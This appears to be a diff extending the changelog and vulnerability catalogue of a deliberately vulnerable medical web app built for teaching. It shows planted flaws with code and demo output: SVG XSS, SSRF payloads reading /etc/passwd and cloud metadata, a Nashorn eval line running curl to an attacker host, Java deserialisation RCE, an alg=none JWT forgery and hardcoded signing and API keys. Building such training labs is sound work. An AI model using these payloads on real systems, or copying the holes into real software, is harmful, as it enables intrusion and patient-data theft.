+```java
+.contentType(file.getContentType())                 // upload-time
+...
+headers.add(HttpHeaders.CONTENT_TYPE, p.contentType()); // GET-time
+```
+No `Content-Disposition: attachment`, no MIME sniffing, no allow-list. Uploading `xss.svg` with header `Content-Type: image/svg+xml`:
+```xml
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><text x="10" y="20">pwn</text></svg>
+```
+GET returns the same content type — browser renders inline, the `<script>` element executes as the doctor's session. Demo verified: upload returned `contentType: image/svg+xml`; GET returned `Content-Type: image/svg+xml` with the SVG body in the response. The `DoctorLabsPage` inline viewer uses an `<img>` tag for `image/*` (renders SVG XSS) and an `<iframe>` for everything else (renders HTML uploads as a child document) — the demo is one click from the list.
+
+---
+
+**220. [A03] `POST /imaging/import-url` plain SSRF — `DoctorLabService.java#importUrl`**
+Identical sink to #214 but with a different downstream path: the fetched bytes are written to disk under the URL's basename. `?url=file:///etc/hostname` returned the 76-byte hostname file and stored it as `imaging/hostname`. Combined with #219 the import-url path becomes "fetch arbitrary URL → store with arbitrary content-type → serve back inline" — three primitives in one POST.
+
+---
+
+**221. [A02] Basename of source URL used as on-disk filename — `DoctorLabService.java#importUrl`**
+```java
+String basename = url.replaceFirst(".*/", "");
+Path storage = IMAGING_DIR.resolve(basename);
+```
+URL fragments / query strings are not stripped — `http://attacker/payload.svg?cb=12345` writes a file literally named `payload.svg?cb=12345`. Worse, traversal segments in the URL path (`http://attacker/..%2f..%2fpayload.jar`) decode to literal `../../payload.jar` on Linux MultipartFile equivalents, escaping the imaging directory. Adds A02 (misconfigured storage layout) to the A03 SSRF.
+
+---
+
+**222. [A09] Sign / upload / import-url all silent — `DoctorLabService.java`**
+No `auditLogRepository.save(...)` on any Module C mutation. The audit trail records the inbound HTTP request (via `LoggingInterceptor`) but not the semantic intent ("doctor X signed order Y with value Z"). Forensic gap: when the MD5 is forged offline (#216) there is no parallel record on the server side that says when or by whom the sign happened.
+
+---
+
+**223. [A10] Verbose fetch / upload errors — `ExternalCatalogueClient.java` + `DoctorLabService.java`**
+```java
+return ("FETCH_ERROR " + e.getClass().getSimpleName() + ": " + e.getMessage()).getBytes();
+...
+throw new RuntimeException("Upload failed: " + e.getClass().getSimpleName() + " " + e.getMessage(), e);
+```
+Internal exception types + messages reach the HTTP response. Useful for fingerprinting JDK / Spring versions, internal hostnames in `ConnectException` messages, filesystem layouts in `NoSuchFileException` messages.
+
+---
+
+**224. [A02] `LabOrderForm.tsx` ships SSRF payloads in placeholder text — `components/doctor/LabOrderForm.tsx` (frontend)**
+```tsx
+<Input ...
+  placeholder="file:///etc/hosts  or  http://169.254.169.254/latest/meta-data/"
+/>
+```
+The form literally suggests two working SSRF payloads. Combined with #214 the demo is "open Doctor → Lab & Imaging → New order → paste suggested URL → Save", and the response body of the local file read shows up in the same page seconds later via the catalogue-response panel.
+
+---
+
+### Phase 3 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
+
+- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with new entities + repos + service + rewritten controller; V21 migration applied on DB already at V20).
+- Backend smoke (curl against running `localhost:8085`):
+  - `customQueryUrl=file:///etc/hosts` returned the host file in `catalogueResponse`.
+  - `POST /lab-orders/1/sign` returned MD5 and flipped status to SIGNED.
+  - SVG upload returned `contentType: image/svg+xml`; subsequent GET echoed the same Content-Type, body served inline with no Content-Disposition.
+  - `import-url file:///etc/hostname` wrote a 76-byte file under `imaging/hostname`.
+- Frontend `npx tsc -b --noEmit` → exit 0.
+- Frontend `npx eslint` (touched files) → 0 errors, 0 warnings.
+- Cross-repo regression: `/admin/users`, `/admin/health`, `/prescriptions`, `/lab-results/search`, `/appointments`, `/stats/recent`, `/doctors`, `/messages/conversations` all 200; Module A (`/doctor/patients`, `/chart`) + Module B (`/doctor/notes`, `/doctor/notes/1`) still 200.
+- Iteration: initial `ExternalCatalogueClient` used `RestTemplateBuilder`-backed `RestTemplate`, which Spring 6 hardens against `file://` URLs. Switched to `URLConnection.openConnection()` so the SSRF demo covers `file://` in addition to HTTP. Cleaner SSRF surface, fewer indirections.
+
+---
+
+## Doctor View Redesign — Module D (E-Prescribing & Drug Safety — Nashorn RCE, unsigned PDF, MD5 sign, SSRF callback)
+
+> Backend: small additive migration `V22__prescription_signing_columns.sql` (adds 6 nullable columns + ai_verified flag to `prescriptions`, relaxes `medical_record_id` to nullable so doctor-issued prescriptions don't require a prior medical record), entity update, `PrescriptionSigner` (MD5 + hardcoded key + key disclosed in response), `DoctorPrescribingService` (pharmacy SSRF, OpenPDF generation, Nashorn `ScriptEngine.eval()` on drug-catalogue response, JWT alg=none co-sign), and a rewritten `DoctorPrescribingController`. UI: real `DoctorPrescribePage` + `PrescriptionSigner` + `DrugInteractionPanel`.
+>
+> This module loads heavily on **A08 (integrity)** with three demos in one file (MD5 sign, unsigned PDF, alg=none co-sign) and on **A03 (supply chain)** with two SSRF sinks (`pharmacyCallbackUrl` POST + `catalogueUrl` GET → Nashorn `eval()` → RCE). The OpenPDF + Nashorn deps pulled in by Phase 0 (pom.xml entries) finally see use here.
+
+### New Files
+
+| File | Description |
+|---|---|
+| `db/migration/V22__prescription_signing_columns.sql` | Adds pharmacy_callback_url, signature_md5, signed_at, signature_jwt, co_signer_username, ai_verified; relaxes medical_record_id |
+| `entity/Prescription.java` (edited) | New nullable columns + `medicalRecord` no longer required |
+| `dto/PrescriptionSignatureDto.java` | Signature payload including the plaintext signing key |
+| `service/PrescriptionSigner.java` | `SECRET = "medi-sig-key-2024"`, MD5 over (id : medication : dosage : SECRET) |
+| `service/DoctorPrescribingService.java` | create + SSRF callback + sign + PDF generation + drug-interactions check + co-sign |
+| `controller/DoctorPrescribingController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced |
+| `service/PrescriptionService.java` (edited) | `medicalRecordId` toDto null-guard so the new nullable-FK rows don't crash existing `/api/prescriptions` callers |
+| **Frontend** `api/doctor.ts` (extended) | `PrescriptionSignature`, `CreatePrescriptionRequest`, `DrugInteractionRequest/Response` types + 5 typed wrappers |
+| **Frontend** `components/doctor/PrescriptionSigner.tsx` | Sign button + key-leak panel + PDF download + JWT co-sign |
+| **Frontend** `components/doctor/DrugInteractionPanel.tsx` | catalogueUrl text input + result panel showing rawResponse + Nashorn-eval result |
+| **Frontend** `pages/doctor/DoctorPrescribePage.tsx` (rewritten) | Prescribe form (with pharmacyCallbackUrl input) + Signer + DrugInteractionPanel |
+
+### Vulnerabilities
+
+**225. [A08] `PrescriptionSigner` uses MD5 with hardcoded key — `service/PrescriptionSigner.java`**
+```java
+public static final String SECRET = "medi-sig-key-2024";
+
+public String md5Signature(Prescription rx) {
+    String payload = rx.getId() + ":" + rx.getMedicationName() + ":" + rx.getDosage() + ":" + SECRET;
+    MessageDigest md = MessageDigest.getInstance("MD5");
+    md.update(payload.getBytes());
+    return HexFormat.of().formatHex(md.digest());
+}
+```
+Three integrity failures combined: (1) MD5 is collision-broken, (2) the key is a public-constant String literal — anyone with the repo (or a single decompiled deployment) recovers it instantly, (3) no asymmetric primitive / certificate chain / PKCS#7 wrapper. Live demo: signing prescription #8 returned `c9022dbddf5983505865e0d507fd72d8` — anyone with the SECRET re-derives it from `8:Demo:10mg:medi-sig-key-2024` and any tampered `(id, medication, dosage)` triple gets a fresh forged signature.
+
+---
+
+**226. [A02][A04] Sign response returns the plaintext signing key — `service/DoctorPrescribingService.java#sign` + `PrescriptionSignatureDto.java`**
+```java
+return PrescriptionSignatureDto.builder()
+        .signatureMd5(sig)
+        .signedPayload(signer.signedPayload(rx))
+        .signingKey(PrescriptionSigner.SECRET)   // [A02] plaintext
+        ...
+        .build();
+```
+The first caller to `POST /sign` immediately learns the symmetric key from the response JSON. A02 (Security Misconfiguration — secret in response) compounds the A04 (Cryptographic Failures — symmetric key embedded in source) story. Live demo: `signingKey: "medi-sig-key-2024"` returned alongside the MD5.
+
+---
+
+**227. [A08] `GET /prescriptions/{id}/pdf` returns an unsigned PDF — `service/DoctorPrescribingService.java#generatePdf`**
+```java
+Document pdf = new Document();
+PdfWriter.getInstance(pdf, baos);
+pdf.open();
+pdf.add(new Paragraph("MediConnect Prescription #" + rx.getId(), ...));
+...
+pdf.add(new Paragraph("Signature (MD5): " + (rx.getSignatureMd5() == null
+        ? "(unsigned)" : rx.getSignatureMd5()), ...));
+pdf.close();
+```
+OpenPDF generates a PDF without any PKCS#7 wrapper, without a digital certificate, without a Content-MD5 header on the HTTP response. The "Signature (MD5):" line in the PDF body is just printed text — not a cryptographic signature. Anyone with the bytes can edit them with any PDF editor and re-print; the patient's pharmacy has no way to detect tampering. Live demo verified: `file /tmp/rx.pdf` → `PDF document, version 1.5, 1 pages` — valid PDF, zero cryptographic protection.
+
+---
+
+**228. [A03] `POST /api/doctor/prescriptions` POSTs to caller-supplied `pharmacyCallbackUrl` — `DoctorPrescribingService.java#create` + `#sendPharmacyNotice`**
+```java
+URI uri = URI.create(url);
+HttpURLConnection conn = (HttpURLConnection) uri.toURL().openConnection();
+conn.setDoOutput(true);
+conn.setRequestMethod("POST");
+String body = String.format(
+    "{\"prescriptionId\":%d,\"patientId\":%s,\"medication\":\"%s\",\"dosage\":\"%s\"}",
+    rx.getId(), ..., rx.getMedicationName(), rx.getDosage());
+conn.getOutputStream().write(body.getBytes(StandardCharsets.UTF_8));
+```
+Outbound POST to attacker-controlled URL with the prescription payload — SSRF + data exfil in one. No allow-list, no scheme restriction. Attacker fields the POST, learns the patient's name + medication, returns a 200 so the doctor's UI shows "Prescription saved" with no indication anything unusual happened.
+
+---
+
+**229. [A03] `POST /drug-interactions/check` SSRF on `catalogueUrl` + Nashorn `eval()` RCE — `DoctorPrescribingService.java#drugInteractions`**
+```java
+byte[] bytes = catalogueClient.fetchBytes(catalogueUrl, hdr);
+String raw = new String(bytes, StandardCharsets.UTF_8);
+ScriptEngineManager mgr = new ScriptEngineManager();
+ScriptEngine js = mgr.getEngineByName("nashorn");
+Object evaluated = js.eval(raw);
+```
+Two compounding sinks:
+1. **A03 SSRF** — `catalogueUrl` fetched server-side via `URLConnection` (same client as Module C).
+2. **A05 Injection / A03 supply-chain** — fetched body passed directly to `ScriptEngine.eval()`. Nashorn lets the caller spawn full JVM access:
+```
+Java.type("java.lang.Runtime").getRuntime().exec("/bin/sh -c 'curl http://attacker/?d=$(id)'")
+```
+Live demo on `localhost:8085`: catalogue served `Java.type("java.lang.System").getProperty("user.name")` from a local Python server on port 9876 — Nashorn evaluated it and returned `"normalized": "jelenarastovic"` (the JVM process owner). One step from there to `Runtime.exec`.
+
+The `nashorn-core:15.6` dependency was pulled into `pom.xml` during Phase 0 specifically for this demo (Nashorn was removed from the JDK in 15+).
+
+---
+
+**230. [A08] Co-sign accepts JWT with `alg: none` — `DoctorPrescribingService.java#coSign`**
+```java
+String jwt = body.get("jwt").toString();
+String sub = jwtVerifier.extractSubjectUnsafe(jwt);
+rx.setSignatureJwt(jwt);
+rx.setCoSignerUsername(sub == null ? "unknown" : sub);
+```
+Reuses `JwtNoneVerifier` from Module B. Header is never checked; signature segment is ignored; `sub` claim is trusted verbatim. Demo verified: posting `{"jwt":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJzZW5pb3ItZG9jdG9yIn0."}` flipped `prescription.coSignerUsername` to `senior-doctor`.
+
+---
+
+**231. [A07] Prescription identities all from request body — `DoctorPrescribingService.java#create`**
+```java
+Long patientId    = numericId(body, "patientId");
+Long doctorId     = numericId(body, "doctorId");
+Long pharmacistId = numericId(body, "pharmacistId");
+```
+No JWT correlation — caller specifies which doctor "issued" the prescription, which patient it's for, which pharmacist dispensed it (if any). Compounds existing `/api/prescriptions` weakness (vuln #109) — the doctor-flow surface inherits the same client-side identity model.
+
+---
+
+**232. [A09] Sign + co-sign + create-with-callback all silent — `DoctorPrescribingService.java`**
+No `auditLogRepository.save(...)` on any module-D mutation. The `LoggingInterceptor` captures the HTTP request but not the semantic intent. When the MD5 is forged offline (#225), no parallel server-side row records who actually fired the sign call.
+
+---
+
+**233. [A10] `sendPharmacyNotice` swallows all downstream errors — `DoctorPrescribingService.java`**
+```java
+try (var in = conn.getInputStream()) { in.readAllBytes(); }
+catch (Exception ignore) { /* [A10] swallow downstream errors */ }
+...
+} catch (Exception ignore) {
+    // [A10] Silent — pharmacy POST failure does not block create.
+}
+```
+The pharmacy callback fails silently. The prescription is created even if the SSRF target returns 500, 401, network errors out, or the response is malformed. From an SSRF perspective this is *useful* — the attacker controls a real endpoint that returns 200 for any payload. From a clinical perspective the prescription is "saved" without any guarantee the pharmacy was actually notified.
+
+---
+
+**234. [A02] Plaintext signing key surfaced in the UI — `PrescriptionSigner.tsx` (frontend)**
+```tsx
+<code className="block text-[11px] font-mono text-[#F85149]">{signature.signingKey}</code>
+```
+The Signer component renders the response field `signingKey` directly to the DOM, copy-paste-ready. A screen recording of the Doctor → Prescribe flow exfiltrates the symmetric key without any DevTools usage. Compounds #226 — the key leak surfaces twice: in the JSON response and in the visible UI.
+
+---
+
+**235. [A03] `DrugInteractionPanel.tsx` default placeholder + result helpers — `DrugInteractionPanel.tsx` (frontend)**
+The catalogue URL input is left blank by default (so the demo is opt-in), but the helper text below it literally prints the Nashorn RCE payload to be served by the attacker:
+```
+Demo payload returned by the catalogue:
+Java.type("java.lang.System").getProperty("user.name")
+```
+And the result panel shows both `rawResponse` (the bytes fetched) and `normalized` (the post-`eval()` value) side by side, so students see SSRF + eval running in one screen.
+
+---
+
+### Bug Caught During Phase 4 Bug Check
+
+- `GET /api/prescriptions` regressed to 500 immediately after V22 relaxed `medical_record_id` to nullable: existing `PrescriptionService#toDto` called `p.getMedicalRecord().getId()` without a null guard. Fixed by adding `p.getMedicalRecord() == null ? null : p.getMedicalRecord().getId()`. Re-smoke after fix: all routes return 200. This is the kind of cross-cutting regression that justifies the "per-phase bug check before continuing" protocol from `DOCTOR_VIEW_PLAN.md` §7.1.
+
+### Phase 4 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
+
+- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with rewritten controller, new service, signer, signature DTO; V22 migration applied on DB at V21).
+- Backend smoke (curl against running `localhost:8085`):
+  - `POST /doctor/prescriptions` 200; `pharmacyCallbackUrl` POST fires.
+  - `POST /prescriptions/8/sign` returned `signatureMd5: c9022dbddf5983505865e0d507fd72d8` + `signingKey: medi-sig-key-2024`.
+  - `GET /prescriptions/8/pdf` → `file` reports `PDF document, version 1.5`.
+  - `POST /drug-interactions/check` with `catalogueUrl=http://localhost:9876/feed.js` (local stub serving JS) → `normalized: jelenarastovic` (Nashorn `System.getProperty` evaluated).
+  - `POST /prescriptions/8/co-sign` with alg=none JWT → `coSignerUsername: senior-doctor`.
+- Frontend `npx tsc -b --noEmit` → exit 0.
+- Frontend `npx eslint` (touched files only) → 0 errors, 0 warnings.
+- Cross-repo regression: all 13 endpoints (8 existing + 4 prior doctor modules + Module D pdf) returned 200 after the `PrescriptionService` null-guard fix above.
+
+---
+
+## Doctor View Redesign — Module E (Telemedicine — plaintext token, public iCal w/ PHI, recording SSRF)
+
+> Backend: `TelemedicineSession` JPA entity + repo + DTO, `DoctorSessionService`, and a rewritten `DoctorSessionController`. Migration `V23__telemedicine_sessions.sql` (renumbered from the original plan's V20 slot — V20–V22 were taken by the prior phases). UI: real `DoctorSessionsPage` + `DoctorSessionRoomPage` + `TelemedicineRoom` (an `<iframe>` pointing at `httpbin.org/anything` so the demo shows the join token landing in a real third-party `Referer` header in DevTools).
+>
+> Module E focuses entirely on **A02 (Security Misconfiguration)**: join token in URL query string, unauthenticated iCal feed that enumerates by `?doctorId`, PHI in SUMMARY / DESCRIPTION fields, no `Content-Disposition`, no `Referrer-Policy`. **A03 (Supply Chain)** is touched once via the recording-attach SSRF that reuses the URLConnection sink from Modules C / D.
+
+### New Files
+
+| File | Description |
+|---|---|
+| `db/migration/V23__telemedicine_sessions.sql` | `telemedicine_sessions` table (room_url, join_token, reason_for_visit, recording_url, recording_path) + 2 seed rows w/ PHI reasons |
+| `entity/TelemedicineSession.java` | JPA entity |
+| `repository/TelemedicineSessionRepository.java` | Find-by-doctor + find-all-ordered |
+| `dto/TelemedicineSessionDto.java` | Response shape; carries token + reason in clear |
+| `service/DoctorSessionService.java` | Create (random 16-char token, embedded in URL), end, attach recording (SSRF via ExternalCatalogueClient), iCal feed builder |
+| `controller/DoctorSessionController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced; `/calendar.ics` produces `text/calendar` |
+| **Frontend** `api/doctor.ts` (extended) | `TelemedicineSession` + `CreateSessionRequest` types + 6 typed wrappers including `icalUrl()` helper |
+| **Frontend** `components/doctor/TelemedicineRoom.tsx` | `<iframe>` to httpbin.org with token in query string — Referer demo live |
+| **Frontend** `pages/doctor/DoctorSessionsPage.tsx` (rewritten) | Sessions table + create form + recording-attach prompt + public iCal subscription panel with `?doctorId` enum input |
+| **Frontend** `pages/doctor/DoctorSessionRoomPage.tsx` (new) | Detail page hosting the room iframe + status info |
+| `pages/doctor/DoctorTelemedicinePage.tsx` (deleted) | Phase 0 stub absorbed into the new pages |
+| `App.tsx` (edited) | Adds `/doctor/telemedicine/:id` route |
+
+### Vulnerabilities
+
+**236. [A02] Join token spliced into room URL query string — `DoctorSessionService.java#create`**
+```java
+String token = generateToken();   // 16 chars from 32-char alphabet → ~80 bits
+TelemedicineSession session = TelemedicineSession.builder()
+    .roomUrl("/doctor/telemedicine/room?session=" + UUID.randomUUID() + "&token=" + token)
+    .joinToken(token)
+    ...
+    .build();
+```
+Token entropy is fine; placement is not. The URL is the room-join URL — every `<img>`, `<script>`, `<link>`, or `fetch()` the room page issues to a different origin gets the full URL as `Referer` (default browser behaviour with no `Referrer-Policy` header). The token is also captured by:
+- Browser history (and synced across devices on logged-in browsers).
+- Server access logs (Apache / nginx / load-balancer access.log records query strings by default).
+- Screenshots / screen-shares — token is plainly visible in the URL bar.
+- Any client-side JS that reads `document.location.search` — even a single XSS anywhere on the same origin exfiltrates the token.
+
+---
+
+**237. [A02] Public iCal feed — no auth required — `DoctorSessionController.java#calendarFeed`**
+```java
+@GetMapping(value = "/calendar.ics", produces = "text/calendar")
+public ResponseEntity<String> calendarFeed(@RequestParam(required = false) Long doctorId) {
+    return ResponseEntity.ok()
+            .contentType(MediaType.parseMediaType("text/calendar"))
+            .body(service.icalFeed(doctorId));
+}
+```
+`SecurityConfig.permitAll()` reaches the route, and the iCal subscription pattern (`webcal://host/feed.ics`) is *expected* to be accessed without authentication by external calendar clients (Apple Calendar, Outlook, Google) — the misconfiguration is that there is no signed token per subscriber. Live demo: `curl http://localhost:8085/api/doctor/sessions/calendar.ics` returned the full VCALENDAR body anonymously.
+
+---
+
+**238. [A02] iCal SUMMARY + DESCRIPTION carry PHI verbatim — `DoctorSessionService.java#icalFeed`**
+```java
+sb.append("SUMMARY:").append(patientName).append(" — ").append(reason).append("\r\n");
+sb.append("DESCRIPTION:").append("Join token: ").append(s.getJoinToken())
+  .append(" · ").append(s.getRoomUrl()).append("\r\n");
+```
+Seed data already includes mentally-loaded reasons: `"Follow-up: HIV-positive status review"`, `"Mental-health intake: bipolar II"`. Live demo response:
+```
+SUMMARY:Ana Jovanovic — Follow-up: HIV-positive status review
+DESCRIPTION:Join token: ROOM-SECRET-AAA · /doctor/telemedicine/rooms/session-1?token=ROOM-SECRET-AAA
+```
+Patient name + clinical reason + join token + full room URL all leak to anyone who guesses or stumbles across the feed URL. Once an attacker subscribes (`webcal://...`) their calendar client polls the feed automatically — long-running passive exfil.
+
+---
+
+**239. [A01] iCal feed scoped only by `?doctorId` query param — `DoctorSessionController.java#calendarFeed`**
+`?doctorId=1`, `?doctorId=2`, … enumerates every doctor's calendar without authentication and without a per-doctor signature in the URL. Incrementing the integer is the entire attack. Live demo: `?doctorId=1` returned doctor 1's calendar; omitting the param dumped *all* sessions for *all* doctors in one response.
+
+---
+
+**240. [A03] `POST /api/doctor/sessions/{id}/recording` SSRF on `recordingUrl` — `DoctorSessionService.java#attachRecording`**
+```java
+byte[] bytes = catalogueClient.fetchBytes(url, hdr);
+String basename = url.replaceFirst(".*/", "");
+Path path = RECORDINGS_DIR.resolve(basename);
+Files.write(path, bytes, ...);
+```
+Reuses `ExternalCatalogueClient` (URLConnection-based, accepts `file://`, `http://`, `https://`, `ftp:`). Live demo: `{"recordingUrl":"file:///etc/passwd"}` returned `recordingPath: recordings/passwd` and the file landed on disk with `/etc/passwd` contents. Same SSRF primitive as Modules C / D, third occurrence on the doctor surface.
+
+---
+
+**241. [A02] basename of `recordingUrl` used as on-disk filename — `DoctorSessionService.java#attachRecording`**
+```java
+String basename = url.replaceFirst(".*/", "");
+Path path = RECORDINGS_DIR.resolve(basename);
+```
+Query strings, traversal segments, URL fragments slip through unchanged: `http://attacker/..%2f..%2fowned.bin` decodes to `../../owned.bin` after URL handler normalisation. Compounds the path-traversal pattern from Module C imaging upload (vulns #218 / #221).
+
+---
+
+**242. [A09] Session create / end / recording-attach all silent — `DoctorSessionService.java`**
+No `auditLogRepository.save(...)` on Module E mutations. Recording attaches in particular *should* produce an audit row (PHI-relevant action), but they don't.
+
+---
+
+**243. [A02] `TelemedicineRoom.tsx` iframe Referer leak — `components/doctor/TelemedicineRoom.tsx` (frontend)**
+```tsx
+const externalRoomUrl =
+  `https://httpbin.org/anything/room?token=${encodeURIComponent(session.joinToken)}&session=${session.id}`
+...
+<iframe src={externalRoomUrl} title={...} className="..." />
+```
+Demo deliberately points at httpbin.org so students can watch the join token arrive in the third-party server's `args.token` field (and in the `Referer` header). The page is hosted on `localhost:5173` (the Vite dev server) with no `Referrer-Policy` meta tag and no `<iframe sandbox>` attribute — browser default sends the full URL as Referer.
+
+---
+
+**244. [A02] No `Content-Disposition` / `Referrer-Policy` on calendar / session responses — `DoctorSessionController.java`**
+The iCal response is served inline (`text/calendar`) with no `Content-Disposition: attachment`, so clicking the link opens the body in the browser tab — the URL appears in browser history. No `Referrer-Policy: no-referrer` on either route means navigations to other pages carry the calendar URL (with any future `?doctorId=` or signed-token query string) as Referer.
+
+---
+
+### Phase 5 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
+
+- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with new entity / repo / service / rewritten controller; V23 migration applied on DB at V22).
+- Backend smoke (curl against running `localhost:8085`):
+  - `POST /doctor/sessions` 201; response contains `roomUrl` with the new token in the query string.
+  - `GET /doctor/sessions/calendar.ics` returned anonymously; SUMMARY rendered "Ana Jovanovic — Follow-up: HIV-positive status review"; DESCRIPTION carried the join token.
+  - `GET /doctor/sessions/calendar.ics?doctorId=1` filtered to doctor 1 with no auth.
+  - `POST /doctor/sessions/1/recording {recordingUrl: "file:///etc/passwd"}` returned `recordingPath: recordings/passwd`; file present on disk.
+- Frontend `npx tsc -b --noEmit` → exit 0 (after deleting the Phase 0 `DoctorTelemedicinePage.tsx` stub absorbed by the new pages).
+- Frontend `npx eslint` (touched files only) → 0 errors, 0 warnings.
+- Cross-repo regression: all 15 endpoints (8 existing + 5 prior doctor modules + 2 Module E) returned 200.
+
+---
+
+## Doctor View Redesign — Module F (AI Diagnostics & Referrals — deserialisation RCE, aiVerified integrity loss, API key leak)
+
+> Backend: new `Referral` JPA entity + `ReferralBundle` serializable + repo + `ReferralDto`, `DoctorReferralService`, `DoctorAIService`, rewritten `DoctorAIController` + `DoctorReferralController`. `MedicalRecord` entity extended with `aiVerified` + `aiModelUrl` columns. Migration `V24__referrals_and_ai_verified.sql` (renumbered from the plan's V21 slot). UI: `AIAssistantPanel` + `AIModelInfoCard` + `ReferralBundleViewer` components, rewritten `DoctorAIAssistantPage` + `DoctorReferralsPage`.
+>
+> Module F is the showcase **A08 (integrity)** module: textbook Java deserialisation RCE on the referrals inbox endpoint *and* LLM responses stored as authoritative `MedicalRecord` rows. Also adds heavy **A02** (hardcoded API key returned in clear via `/model-info` and sent on every outbound request even when the caller redirects to an attacker host) and **A03** (modelUrl SSRF with full PHI exfil).
+
+### New Files
+
+| File | Description |
+|---|---|
+| `db/migration/V24__referrals_and_ai_verified.sql` | `referrals` table + 1 seed + adds `ai_verified` + `ai_model_url` cols to `medical_records` |
+| `entity/Referral.java` | JPA entity for the referrals table; `bundle_payload` is a base64 ObjectOutputStream blob |
+| `entity/MedicalRecord.java` (edited) | `aiVerified` + `aiModelUrl` fields |
+| `repository/ReferralRepository.java` | find-all-ordered |
+| `dto/ReferralBundle.java` | **Serializable** payload class with `readObject` that runs `cmd` via `Runtime.exec` — the deserialisation RCE primitive |
+| `dto/ReferralDto.java` | Inbox response shape; carries decoded preview + raw base64 payload |
+| `service/DoctorReferralService.java` | Create + inbox (calls `ObjectInputStream.readObject()` with no class filter) + accept (second readObject + writes a MedicalRecord into the recipient's chart) |
+| `service/DoctorAIService.java` | suggest (modelUrl SSRF + AI key sent in Authorization header) + summarize-record (stores LLM response as aiVerified=true) + model-info (key in clear) |
+| `controller/DoctorAIController.java` (rewritten) | Wires DoctorAIService |
+| `controller/DoctorReferralController.java` (rewritten) | Wires DoctorReferralService |
+| **Frontend** `api/doctor.ts` (extended) | Module F types (`AIModelInfo`, `AISuggestRequest/Response`, `Referral`, `CreateReferralRequest`) + 6 typed wrappers |
+| **Frontend** `components/doctor/AIAssistantPanel.tsx` | modelUrl input + summarise button + key info card |
+| **Frontend** `components/doctor/ReferralBundleViewer.tsx` | Inbox row renderer — runs `dangerouslySetInnerHTML` on bundle summary; Accept → chart button |
+| **Frontend** `pages/doctor/DoctorAIAssistantPage.tsx` (rewritten) | Two-column layout: panel + model info |
+| **Frontend** `pages/doctor/DoctorReferralsPage.tsx` (rewritten) | Inbox + compose form with base64 payload textarea |
+
+### Vulnerabilities
+
+**245. [A08] Java deserialisation RCE on referral inbox — `DoctorReferralService.java#decodeBundle` + `dto/ReferralBundle.java`**
+```java
+byte[] bytes = Base64.getDecoder().decode(b64);
+try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
+    Object o = ois.readObject();
+    if (o instanceof ReferralBundle b) return b;
+}
+```
+No `ObjectInputFilter`, no class allow-list, no `setObjectInputFilter` configured on the stream. `ReferralBundle.readObject` runs `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd})` when its `cmd` field is non-null.
+
+Live demo on `localhost:8085`:
+1. Compiled a small `MakeBundle.java` against the running app's classpath (`target/classes`).
+2. Built a `ReferralBundle` with `cmd = "touch /tmp/PHASE6-RCE-PWN"`, serialised it, base64-encoded the bytes.
+3. `POST /api/doctor/referrals` with the base64 in `bundlePayload`.
+4. `GET /api/doctor/referrals/inbox` → service deserialised every row, `readObject` fired `Runtime.exec`.
+5. `/tmp/PHASE6-RCE-PWN` file appeared on disk owned by the JVM user.
+
+Two opportunities to trigger the same RCE: `/inbox` deserialises every row on page load, and `/accept` deserialises again on click.
+
+---
+
+**246. [A08] `accept` writes a `MedicalRecord` from the deserialised bundle with no provenance — `DoctorReferralService.java#accept`**
+```java
+if (bundle != null && r.getToDoctor() != null && r.getPatient() != null) {
+    MedicalRecord rec = MedicalRecord.builder()
+            .patient(r.getPatient())
+            .doctor(r.getToDoctor())
+            .diagnosis(bundle.diagnosis == null ? bundle.summary : bundle.diagnosis)
+            .prescription(bundle.medication == null ? bundle.summary : bundle.medication)
+            ...
+            .build();
+    medicalRecordRepository.save(rec);
+}
+```
+The recipient inherits attacker-asserted diagnosis + medication. No human review, no signature, no countersignature, no audit row for the transfer.
+
+---
+
+**247. [A02] `GET /api/doctor/ai/model-info` returns the AI API key in clear — `DoctorAIService.java#modelInfo`**
+```java
+out.put("gatewayUrl", AI_GATEWAY_URL);
+out.put("apiKey", AI_API_KEY);
+out.put("model", AI_MODEL);
+```
+Live demo: `GET /api/doctor/ai/model-info` returned:
+```json
+{"gatewayUrl":"https://api.openai.example.com/v1/chat/completions",
+ "apiKey":"sk-mediconnect-prod-OZk1JxFhvE2pXt9rW3aB7Cq",
+ "model":"gpt-medi-clinical-v1","status":"ok"}
+```
+Frontend `AIModelInfoCard` renders the key in plain text in the side panel, no copy-restriction. Compounds with #248 — every doctor opening the AI Assist page reads + displays the prod key.
+
+---
+
+**248. [A04] AI API key hardcoded in source — `DoctorAIService.java`**
+```java
+public static final String AI_API_KEY = "sk-mediconnect-prod-OZk1JxFhvE2pXt9rW3aB7Cq";
+```
+`public static final` constant. Visible in every compiled .class on every deployed node. Cryptographic-failure category in its own right separate from the "leak in response" of #247.
+
+---
+
+**249. [A03] `POST /api/doctor/ai/suggest` SSRF + PHI exfil + key leak on outbound — `DoctorAIService.java#suggest` + `postJsonAndReadResponse`**
+```java
+String modelUrl = body.get("modelUrl").toString();
+...
+conn.setRequestProperty("Authorization", "Bearer " + AI_API_KEY);
+try (OutputStream os = conn.getOutputStream()) {
+    os.write(payload.getBytes(StandardCharsets.UTF_8));
+}
+```
+Three things in one POST:
+1. **SSRF** — attacker-supplied `modelUrl` reached by URLConnection, identical sink to Modules C / D / E.
+2. **PHI exfil** — outbound JSON body contains patient id + full name + DOB + allergies + blood type, all assembled from the DB on the server side.
+3. **Key leak on outbound** — `Authorization: Bearer sk-mediconnect-prod-…` sent on every request even when the caller specified an attacker-controlled URL. The attacker's HTTP server logs the header verbatim → key harvested.
+
+Live demo: `modelUrl=http://localhost:9876/v1/chat` returned an `outboundPayload` field containing `"patient":{"id":1,"name":"Ana Jovanovic","dob":"1990-05-15","allergies":"Penicillin, Pollen","bloodType":"A+"}` — full PHI shipped to attacker.
+
+---
+
